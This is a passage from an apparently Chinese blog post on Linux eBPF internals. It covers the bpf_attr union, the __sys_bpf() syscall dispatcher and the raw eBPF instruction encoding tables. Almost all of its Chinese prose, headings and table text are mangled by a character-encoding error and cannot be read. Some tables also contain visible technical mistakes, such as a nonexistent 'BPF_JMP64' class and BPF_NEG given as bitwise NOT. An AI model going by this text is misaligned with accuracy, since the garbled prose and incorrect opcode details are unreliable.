output: probe_offset */</span><br>__u64probe_addr;<span class="hljs-comment">/* output: probe_addr */</span><br>&#125; task_fd_query;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_LINK_CREATE command */</span><br>__u32prog_fd;<span class="hljs-comment">/* eBPF program to attach */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u32target_fd;<span class="hljs-comment">/* object to attach to */</span><br>__u32target_ifindex; <span class="hljs-comment">/* target ifindex */</span><br>&#125;;<br>__u32attach_type;<span class="hljs-comment">/* attach type */</span><br>__u32flags;<span class="hljs-comment">/* extra flags */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u32target_btf_id;<span class="hljs-comment">/* btf_id of target to attach to */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__aligned_u64iter_info;<span class="hljs-comment">/* extra bpf_iter_link_info */</span><br>__u32iter_info_len;<span class="hljs-comment">/* iter_info length */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/* black box user-provided value passed through</span><br><span class="hljs-comment"> * to BPF program at the execution time and</span><br><span class="hljs-comment"> * accessible through bpf_get_attach_cookie() BPF helper</span><br><span class="hljs-comment"> */</span><br>__u64bpf_cookie;<br>&#125; perf_event;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32flags;<br>__u32cnt;<br>__aligned_u64syms;<br>__aligned_u64addrs;<br>__aligned_u64cookies;<br>&#125; kprobe_multi;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/* this is overlaid with the target_btf_id above. */</span><br>__u32target_btf_id;<br><span class="hljs-comment">/* black box user-provided value passed through</span><br><span class="hljs-comment"> * to BPF program at the execution time and</span><br><span class="hljs-comment"> * accessible through bpf_get_attach_cookie() BPF helper</span><br><span class="hljs-comment"> */</span><br>__u64cookie;<br>&#125; tracing;<br>&#125;;<br>&#125; link_create;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_LINK_UPDATE command */</span><br>__u32link_fd;<span class="hljs-comment">/* link fd */</span><br><span class="hljs-comment">/* new program fd to update link with */</span><br>__u32new_prog_fd;<br>__u32flags;<span class="hljs-comment">/* extra flags */</span><br><span class="hljs-comment">/* expected link&#x27;s program fd; is specified only if</span><br><span class="hljs-comment"> * BPF_F_REPLACE flag is set in flags */</span><br>__u32old_prog_fd;<br>&#125; link_update;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32link_fd;<br>&#125; link_detach;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_ENABLE_STATS command */</span><br>__u32type;<br>&#125; enable_stats;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_ITER_CREATE command */</span><br>__u32link_fd;<br>__u32flags;<br>&#125; iter_create;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_PROG_BIND_MAP command */</span><br>__u32prog_fd;<br>__u32map_fd;<br>__u32flags;<span class="hljs-comment">/* extra flags */</span><br>&#125; prog_bind_map;<br><br>&#125; __attribute__((aligned(<span class="hljs-number">8</span>)));<br></code></pre></td></tr></table></figure><h2 id="äºŒã€-sys-bpf-ï¼šbpf-ç³»ç»Ÿè°ƒç”¨çš„æ ¸å¿ƒå‡½æ•°"><a href="#äºŒã€-sys-bpf-ï¼šbpf-ç³»ç»Ÿè°ƒç”¨çš„æ ¸å¿ƒå‡½æ•°" class="headerlink" title="äºŒã€__sys_bpf()ï¼šbpf ç³»ç»Ÿè°ƒç”¨çš„æ ¸å¿ƒå‡½æ•°"></a>äºŒã€__sys_bpf()ï¼šbpf ç³»ç»Ÿè°ƒç”¨çš„æ ¸å¿ƒå‡½æ•°</h2><p>bpf ç³»ç»Ÿè°ƒç”¨å®šä¹‰äº <code>kernel/bpf/syscall.c</code> ä¸­ï¼Œæœ€ç»ˆè°ƒç”¨åˆ° <code>__sys_bpf()</code> ï¼Œå…¶æ ¸å¿ƒä¸»è¦æ˜¯ä¸€ä¸ªå·¨å¤§çš„ switchï¼Œæ ¹æ® cmd çš„ä¸åŒè¿›è¡Œä¸åŒçš„æ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __sys_bpf(<span class="hljs-type">int</span> cmd, <span class="hljs-type">bpfptr_t</span> uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span>;</span><br><span class="hljs-type">bool</span> capable;<br><span class="hljs-type">int</span> err;<br><br>capable = bpf_capable() || !sysctl_unprivileged_bpf_disabled;<br><br><span class="hljs-comment">/* Intent here is for unprivileged_bpf_disabled to block key object</span><br><span class="hljs-comment"> * creation commands for unprivileged users; other actions depend</span><br><span class="hljs-comment"> * of fd availability and access to bpffs, so are dependent on</span><br><span class="hljs-comment"> * object creation success.  Capabilities are later verified for</span><br><span class="hljs-comment"> * operations such as load and map create, so even with unprivileged</span><br><span class="hljs-comment"> * BPF disabled, capability checks are still carried out for these</span><br><span class="hljs-comment"> * and other operations.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!capable &amp;&amp;<br>    (cmd == BPF_MAP_CREATE || cmd == BPF_PROG_LOAD))<br><span class="hljs-keyword">return</span> -EPERM;<br><br>err = bpf_check_uarg_tail_zero(uattr, <span class="hljs-keyword">sizeof</span>(attr), size);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br>size = <span class="hljs-type">min_t</span>(u32, size, <span class="hljs-keyword">sizeof</span>(attr));<br><br><span class="hljs-comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span><br><span class="hljs-built_in">memset</span>(&amp;attr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(attr));<br><span class="hljs-keyword">if</span> (copy_from_bpfptr(&amp;attr, uattr, size) != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>err = security_bpf(cmd, &amp;attr, size);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> BPF_MAP_CREATE:<br>err = map_create(&amp;attr);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">default</span>:<br>err = -EINVAL;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br>SYSCALL_DEFINE3(bpf, <span class="hljs-type">int</span>, cmd, <span class="hljs-keyword">union</span> bpf_attr __user *, uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, size)<br>&#123;<br><span class="hljs-keyword">return</span> __sys_bpf(cmd, USER_BPFPTR(uattr), size);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-raw-eBPF-ç¨‹åºç¼–å†™å…¥é—¨"><a href="#0x03-raw-eBPF-ç¨‹åºç¼–å†™å…¥é—¨" class="headerlink" title="0x03. raw eBPF ç¨‹åºç¼–å†™å…¥é—¨"></a>0x03. raw eBPF ç¨‹åºç¼–å†™å…¥é—¨</h1><p>ç”±äº eBPF ç›¸å…³çš„å„ç§æ“ä½œå®é™…ä¸Šéƒ½æ˜¯é€šè¿‡ <code>bpf()</code> ç³»ç»Ÿè°ƒç”¨å®Œæˆçš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æ¥è°ƒç”¨ <code>bpf()</code> ç³»ç»Ÿè°ƒç”¨æ¥æ„Ÿå— eBPF çš„é­…åŠ›ï¼šï¼‰</p><blockquote><p>æ³¨ï¼šåœ¨ eBPF çš„å®é™…åº”ç”¨ä¸­å¾ˆå°‘ä¼šç›´æ¥å†™ raw BPF æŒ‡ä»¤ï¼Œè€Œæ˜¯ä¼šå€ŸåŠ©è¯¸å¦‚ <code>bcc</code> è¿™æ ·çš„å„ç±»å·¥å…·ï¼Œä¸è¿‡é‚£ä¸æ˜¯è¿™ä¸€ç¯‡åšå®¢çš„é‡ç‚¹ï¼šï¼‰</p><blockquote><p>æœ‰æ—¶é—´çš„è¯å†åœ¨åé¢çš„åšå®¢ä¸­ç®€å•è®²è®²ï¼ˆ</p></blockquote></blockquote><blockquote><p>æ³¨2ï¼šå†…æ ¸åœ¨ <code>/samples/bpf</code> ç›®å½•ä¸‹æä¾›äº†å¾ˆå¤šå¸®åŠ©æˆ‘ä»¬å¿«é€Ÿç¼–å†™ eBPF ç¨‹åºçš„å·¥å…·ä¸ä¸€äº›ç¤ºä¾‹ï¼Œå…¶ä¸­ <code>/samples/bpf/bpf_insn.h</code> æ–‡ä»¶<strong>æä¾›äº†å°è£…å¥½çš„å„ç±»æŒ‡ä»¤æ¨¡æ¿</strong> ï¼šï¼‰</p></blockquote><h2 id="ä¸€ã€eBPF-æŒ‡ä»¤æ ¼å¼"><a href="#ä¸€ã€eBPF-æŒ‡ä»¤æ ¼å¼" class="headerlink" title="ä¸€ã€eBPF æŒ‡ä»¤æ ¼å¼"></a>ä¸€ã€eBPF æŒ‡ä»¤æ ¼å¼</h2><p>eBPF ä¸ºä¼˜é›…çš„ RISC æŒ‡ä»¤é›†ï¼ˆ<del>è¿™å°±è¦è¯´åˆ° Intel CISC çš„å«å±é‡äº†</del>ï¼‰ï¼Œå•æ¡æŒ‡ä»¤é•¿åº¦ä¸º 8 å­—èŠ‚ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> &#123;</span><br>__u8code;<span class="hljs-comment">/* æ“ä½œç  */</span><br>__u8dst_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* ç›®çš„å¯„å­˜å™¨ */</span><br>__u8src_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* æºå¯„å­˜å™¨ */</span><br>__s16off;<span class="hljs-comment">/* æœ‰ç¬¦å·åç§» */</span><br>__s32imm;<span class="hljs-comment">/* æœ‰ç¬¦å·ç«‹å³æ•° */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>è€Œ eBPF å®é™…ä¸Šæœ‰ä¸¤ç§ç¼–ç æ¨¡å¼ï¼š</p><ul><li>åŸºç¡€ç¼–ç ï¼Œå•æ¡æŒ‡ä»¤ä¸º 64 bit</li><li>å®½æŒ‡ä»¤ç¼–ç ï¼Œ <em>åœ¨åŸºç¡€ç¼–ç åæ·»åŠ ä¸€ä¸ª 64bit çš„ç«‹å³æ•°</em> ï¼Œå•æ¡æŒ‡ä»¤ä¸º 128 bit</li></ul><p>åŸºç¡€ç¼–ç çš„æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="center">é•¿åº¦</th><th align="center">8 bits</th><th align="center">4 bits</th><th align="center">4 bits</th><th align="center">16 bits</th><th align="center">32 bits</th></tr></thead><tbody><tr><td align="center">å«ä¹‰</td><td align="center">opcode(æ“ä½œç )</td><td align="center">dst_reg(ç›®çš„å¯„å­˜å™¨)</td><td align="center">src_reg(æºå¯„å­˜å™¨)</td><td align="center">off(æœ‰ç¬¦å·åç§»)</td><td align="center">imm(æœ‰ç¬¦å·32ä½ç«‹å³æ•°)</td></tr></tbody></table><p>eBPF æŒ‡ä»¤ä¸­çš„ <code>opcode</code> åŸŸé•¿åº¦ä¸º 8 bitï¼Œå…¶ä¸­<strong>ä½ 3 ä½å›ºå®šè¡¨ç¤ºæŒ‡ä»¤ç±»å‹</strong>ï¼Œå‰©ä¸‹çš„é«˜ 5 ä½æ ¹æ®ç±»å‹ä¸åŒç”¨é€”ä¹Ÿä¸åŒ</p><p>æŒ‡ä»¤ç±»å‹å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š </p><table><thead><tr><th align="center">ç±»å‹</th><th align="center">å€¼</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">BPF_LD</td><td align="center">0x00</td><td align="center">åªèƒ½ç”¨äºå®½æŒ‡ä»¤ï¼Œä» <code>imm64</code> ä¸­åŠ è½½æ•°æ®åˆ°å¯„å­˜å™¨</td></tr><tr><td align="center">BPF_LDX</td><td align="center">0x01</td><td align="center">ä»å†…å­˜ä¸­åŠ è½½æ•°æ®åˆ° <code>dst_reg</code></td></tr><tr><td align="center">BPF_ST</td><td align="center">0x02</td><td align="center">æŠŠ <code>imm32</code> æ•°æ®ä¿å­˜åˆ°å†…å­˜ä¸­</td></tr><tr><td align="center">BPF_STX</td><td align="center">0x03</td><td align="center">æŠŠ <code>src_reg</code> å¯„å­˜å™¨æ•°æ®ä¿å­˜åˆ°å†…å­˜</td></tr><tr><td align="center">BPF_ALU</td><td align="center">0x04</td><td align="center">32bit ç®—æœ¯è¿ç®—</td></tr><tr><td align="center">BPF_JMP</td><td align="center">0x05</td><td align="center">64bit è·³è½¬æ“ä½œ</td></tr><tr><td align="center">BPF_JMP32</td><td align="center">0x06</td><td align="center">32bit è·³è½¬æ“ä½œ</td></tr><tr><td align="center">BPF_ALU64</td><td align="center">0x07</td><td align="center">64bit ç®—æœ¯è¿ç®—</td></tr></tbody></table><blockquote><p>æ³¨ï¼šåœ¨ classic BPF ä¸­ <code>0x06</code> ä¸ºå‡½æ•°è¿”å›æŒ‡ä»¤ <code>BPF_RET</code> ï¼Œ<code>0x07</code> ä¸ºå¯„å­˜å™¨äº¤æ¢æŒ‡ä»¤ <code>BPF_MISC</code> ï¼ˆcBPF åªæœ‰ <code>A</code> å’Œ <code>X</code> ä¸¤ä¸ªå¯„å­˜å™¨ï¼‰</p></blockquote><p><img src="https://s2.loli.net/2023/05/29/ctkw1sIlfAYp8Hz.png" alt="æˆ‘è¶…,__ï¼.png"></p><h3 id="ç®—æœ¯-amp-è·³è½¬æŒ‡ä»¤"><a href="#ç®—æœ¯-amp-è·³è½¬æŒ‡ä»¤" class="headerlink" title="ç®—æœ¯ &amp; è·³è½¬æŒ‡ä»¤"></a>ç®—æœ¯ &amp; è·³è½¬æŒ‡ä»¤</h3><p>å¯¹äºç®—æœ¯ &amp; è·³è½¬æŒ‡ä»¤è€Œè¨€ç”±é«˜ä½åˆ°ä½ä½åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><table><thead><tr><th align="center">4 bit</th><th align="center">1 bit</th><th align="center">3 bit</th></tr></thead><tbody><tr><td align="center">operation code ï¼ˆæ“ä½œä»£ç ï¼‰</td><td align="center">sourceï¼ˆæºï¼‰</td><td align="center">instruction class ï¼ˆæŒ‡ä»¤ç±»å‹ï¼‰</td></tr></tbody></table><h4 id="â‘ -æ“ä½œä»£ç "><a href="#â‘ -æ“ä½œä»£ç " class="headerlink" title="â‘  æ“ä½œä»£ç "></a>â‘  æ“ä½œä»£ç </h4><p>opcode çš„<strong>æœ€é«˜ 4 bit ç”¨æ¥ä¿å­˜æ“ä½œä»£ç </strong>ï¼Œå¯¹äºç®—æœ¯æŒ‡ä»¤è€Œè¨€æœ‰å¦‚ä¸‹ç±»å‹ï¼š</p><table><thead><tr><th align="center">æŒ‡ä»¤ç±»å‹</th><th align="center">æ“ä½œä»£ç </th><th align="center">å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_ADD</td><td align="center">0x00</td><td>dst +&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_SUB</td><td align="center">0x10</td><td>dst -&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_MUL</td><td align="center">0x20</td><td>dst *&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_DIV</td><td align="center">0x30</td><td>dst &#x2F;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_OR</td><td align="center">0x40</td><td>dst |&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_AND</td><td align="center">0x50</td><td>dst &amp;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_LSH</td><td align="center">0x60</td><td>dst &lt;&lt;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_RSH</td><td align="center">0x70</td><td>dst &gt;&gt;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_NEG</td><td align="center">0x80</td><td>dst &#x3D; ~src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_MOD</td><td align="center">0x90</td><td>dst %&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_XOR</td><td align="center">0xA0</td><td>dst ^&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_MOV</td><td align="center">0xB0</td><td>dst &#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_ARSH</td><td align="center">0xC0</td><td>ç®—æœ¯å³ç§»æ“ä½œï¼ˆæ­£æ•°è¡¥ 0 è´Ÿæ•°è¡¥ 1 ï¼‰</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_END</td><td align="center">0xD0</td><td>å­—èŠ‚åºè½¬æ¢</td></tr></tbody></table><p>å¯¹äºè·³è½¬æŒ‡ä»¤è€Œè¨€æœ‰å¦‚ä¸‹ç±»å‹ï¼š</p><table><thead><tr><th align="center"><strong>æŒ‡ä»¤ç±»å‹</strong></th><th align="center"><strong>æ“ä½œä»£ç </strong></th><th align="center"><strong>å€¼</strong></th><th><strong>æè¿°</strong></th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">BPF_JMP</td><td align="center">BPF_JA</td><td align="center">0x00</td><td>PC +&#x3D; off</td><td>ä»…ç”¨äº BPF_JMP</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JEQ</td><td align="center">0x10</td><td>PC +&#x3D; off if dst &#x3D;&#x3D; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JGT</td><td align="center">0x20</td><td>PC +&#x3D; off if dst &gt; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JGE</td><td align="center">0x30</td><td>PC +&#x3D; off if dst &gt;&#x3D; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSET</td><td align="center">0x40</td><td>PC +&#x3D; off if dst &amp; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JNE</td><td align="center">0x50</td><td>PC +&#x3D; off if dst !&#x3D; src</td><td>ä»… eBPFï¼šä¸ç­‰æ—¶è·³è½¬</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSGT</td><td align="center">0x60</td><td>PC +&#x3D; off if dst &gt; src</td><td>ä»… eBPFï¼šæœ‰ç¬¦å· â€˜&gt;â€™</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSGE</td><td align="center">0x70</td><td>PC +&#x3D; off if dst &gt;&#x3D; src</td><td>ä»… eBPFï¼šæœ‰ç¬¦å· â€˜&gt;&#x3D;â€™</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_CALL</td><td align="center">0x80</td><td>å‡½æ•°è°ƒç”¨</td><td>ä»… eBPFï¼šå‡½æ•°è°ƒç”¨</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_EXIT</td><td align="center">0x90</td><td>å‡½æ•°æˆ–è€…ç¨‹åºè¿”å›</td><td>ä»… eBPFï¼šå‡½æ•°è¿”å›</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JLT</td><td align="center">0xA0</td><td>PC +&#x3D; off if dst &lt; src</td><td>ä»… eBPFï¼šæ— ç¬¦å· â€˜&lt;â€™</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JLE</td><td align="center">0xB0</td><td>PC +&#x3D; off if dst &lt;&#x3D; src</td><td>ä»… eBPFï¼šæ— ç¬¦å· â€˜&lt;&#x3D;â€™</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSLT</td><td align="center">0xC0</td><td>PC +&#x3D; off if dst &lt; src</td><td>ä»… eBPFï¼šæœ‰ç¬¦å· â€˜&lt;â€™</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSLE</td><td align="center">0xD0</td><td>PC +&#x3D; off if dst &lt;&#x3D; src</td><td>ä»… eBPFï¼šæœ‰ç¬¦å· â€˜&lt;&#x3D;â€™</td></tr></tbody></table><h4 id="â‘¡-æº"><a href="#â‘¡-æº" class="headerlink" title="â‘¡ æº"></a>â‘¡ æº</h4><p>opcode ä¸­é—´çš„ä¸€ä¸ª bit ç”¨æ¥è¡¨ç¤º <strong>æº</strong> ï¼Œå¯¹äºæ™®é€šçš„è·³è½¬ä¸ç®—æœ¯æŒ‡ä»¤è€Œè¨€å«ä¹‰å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th align="center">æŒ‡ä»¤ç±»å‹</th><th align="center">æº</th><th align="center">å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64 &#x2F; BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_K</td><td align="center">0x00</td><td>ä½¿ç”¨32-bit <code>imm32</code> ä½œä¸ºæºæ“ä½œæ•°</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64 &#x2F; BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_X</td><td align="center">0x08</td><td>ä½¿ç”¨æºå¯„å­˜å™¨ ï¼ˆ<code>src_reg</code>ï¼‰ ä½œä¸ºæºæ“ä½œæ•°</td></tr></tbody></table><p>å¯¹äº <code>BPF_END</code> æ“ä½œç è€Œè¨€å«ä¹‰å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="center">æŒ‡ä»¤ç±»å‹</th><th align="center">æ“ä½œä»£ç </th><th align="center">æº</th><th>å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_END</td><td align="center">BPF_TO_LE</td><td>0x00</td><td>è½¬ä¸ºå°ç«¯åº</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_END</td><td align="center">BPF_TO_BE</td><td>0x08</td><td>è½¬ä¸ºå¤§ç«¯åº</td></tr></tbody></table><h3 id="Load-amp-Store-æŒ‡ä»¤"><a href="#Load-amp-Store-æŒ‡ä»¤" class="headerlink" title="Load &amp; Store æŒ‡ä»¤"></a>Load &amp; Store æŒ‡ä»¤</h3><p>å¯¹äº Load &amp; Store æŒ‡ä»¤è€Œè¨€ï¼Œopcode ç”±é«˜åˆ°ä½åˆ†ä¸ºå¦‚ä¸‹ä¸‰éƒ¨åˆ†ï¼š</p><table><thead><tr><th align="center">3 bits</th><th align="center">2 bit</th><th align="center">3 bits</th></tr></thead><tbody><tr><td align="center">modeï¼ˆæ¨¡å¼ï¼‰</td><td align="center">sizeï¼ˆå¤§å°ï¼‰</td><td align="center">instruction class ï¼ˆæŒ‡ä»¤ç±»å‹ï¼‰</td></tr></tbody></table><h4 id="â‘ -å¤§å°"><a href="#â‘ -å¤§å°" class="headerlink" title="â‘  å¤§å°"></a>â‘  å¤§å°</h4><p> Load &amp; Store æŒ‡ä»¤çš„ <strong>size</strong> åŸŸç”¨æ¥è¡¨ç¤º<strong>æ“ä½œçš„å­—èŠ‚æ•°</strong>ï¼š</p><blockquote><p>ä¸çŸ¥é“ä¸ºå•¥æ’åºè®¾ä¸º 4 2 1 8 :ï¼ˆ</p></blockquote><table><thead><tr><th align="center">å¤§å°</th><th align="center">å€¼</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">BPF_W</td><td align="center">0x00</td><td align="center">å•å­—ï¼ˆ4 å­—èŠ‚ï¼‰</td></tr><tr><td align="center">BPF_H</td><td align="center">0x08</td><td align="center">åŠå­—ï¼ˆ2å­—èŠ‚ï¼‰</td></tr><tr><td align="center">BPF_B</td><td align="center">0x10</td><td align="center">å•å­—èŠ‚ï¼ˆ1å­—èŠ‚ï¼‰</td></tr><tr><td align="center">BPF_DW</td><td align="center">0x18</td><td align="center">åŒå­—ï¼ˆ8å­—èŠ‚ï¼‰</td></tr></tbody></table><h4 id="â‘¡-æ¨¡å¼"><a href="#â‘¡-æ¨¡å¼" class="headerlink" title="â‘¡ æ¨¡å¼"></a>â‘¡ æ¨¡å¼</h4><p> Load &amp; Store æŒ‡ä»¤çš„ <strong>mode</strong> åŸŸç”¨æ¥è¡¨ç¤º<strong>æ“ä½œçš„æ¨¡å¼</strong>ï¼Œä¹Ÿå°±æ˜¯å¦‚ä½•å»æ“ä½œæŒ‡å®šå¤§å°çš„æ•°æ®ï¼š</p><table><thead><tr><th align="center">æ¨¡å¼</th><th align="center">å€¼</th><th align="center">æè¿°</th><th align="center">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">BPF_IMM</td><td align="center">0x00</td><td align="center">64 ä½ç«‹å³æ•°</td><td align="center">eBPF ä¸º64 ä½ç«‹å³æ•°ï¼ŒcBPF ä¸­ä¸º 32 ä½</td></tr><tr><td align="center">BPF_ABS</td><td align="center">0x20</td><td align="center">æ•°æ®åŒ…ç›´æ¥è®¿é—®</td><td align="center">å…¼å®¹è‡ª cBPF æŒ‡ä»¤ã€‚R6 ä½œä¸ºéšå¼è¾“å…¥ï¼Œå­˜æ”¾ <code>struct *sk_buff</code> ï¼›R0 ä½œä¸ºéšå¼è¾“å‡ºï¼Œå­˜æ”¾åŒ…ä¸­è¯»å‡ºæ•°æ®ï¼›R1 ~ R5 ä½œä¸º scratch registersï¼Œåœ¨æ¯æ¬¡è°ƒç”¨åä¼šè¢«æ¸…ç©º</td></tr><tr><td align="center">BPF_IND</td><td align="center">0x40</td><td align="center">æ•°æ®åŒ…é—´æ¥è®¿é—®</td><td align="center">åŒ BPF_ABS</td></tr><tr><td align="center">BPF_MEM</td><td align="center">0x60</td><td align="center">èµ‹å€¼ç»™ *(size *)(dst_reg + off)</td><td align="center">æ ‡å‡† load &amp; store æ“ä½œ</td></tr><tr><td align="center">BPF_LEN</td><td align="center">0x80</td><td align="center">ä¿ç•™æŒ‡ä»¤</td><td align="center">ä»…ç”¨äº cBPF</td></tr><tr><td align="center">BPF_MSH</td><td align="center">0xA0</td><td align="center">ä¿ç•™æŒ‡ä»¤</td><td align="center">ä»…ç”¨äº cBPF</td></tr><tr><td align="center">BPF_XADD</td><td align="center">0xC0</td><td align="center">åŸå­æ“ä½œï¼Œ*(æ— ç¬¦å·ç±»å‹ *)(dst_reg + off16) è¿ç®—&#x3D; src_reg</td><td align="center">ä»…ç”¨äº eBPFï¼Œä¸æ”¯æŒ 1 &#x2F; 2 å­—èŠ‚æ›¹ç¥–</td></tr></tbody></table><p>å¯¹äº <code>BPF_XADD</code>ï¼Œ <code>imm32</code> åŸŸè¢«ç”¨æ¥è¡¨ç¤ºåŸå­æ“ä½œçš„è¿ç®—ç±»å‹ï¼š</p><table><thead><tr><th align="center">imm32</th><th align="center">å€¼</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">BPF_ADD</td><td align="center">0x00</td><td 